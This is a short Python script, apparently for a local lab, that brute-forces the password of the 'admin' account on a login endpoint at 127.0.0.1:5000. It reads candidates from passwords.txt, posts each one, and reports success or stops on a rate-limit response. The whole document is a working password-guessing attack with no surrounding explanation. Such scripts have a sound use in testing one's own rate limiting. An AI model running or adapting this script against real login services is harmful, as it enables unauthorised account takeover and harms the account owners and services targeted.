import requests

url = 'http://127.0.0.1:5000/login'
username = 'admin'

with open('passwords.txt', 'r') as file:
    for line in file:
        password = line.strip()
        print(f"[!] Trying password: {password}")
        response = requests.post(url, json={"username": username, "password": password})

        if response.status_code == 200:
            print(f"[+] Success! Password found: {password}")
            break
        elif response.status_code == 429:
            print("[-] Rate limit exceeded. Try again later.")
            break
        else:
            print("[-] Incorrect password")
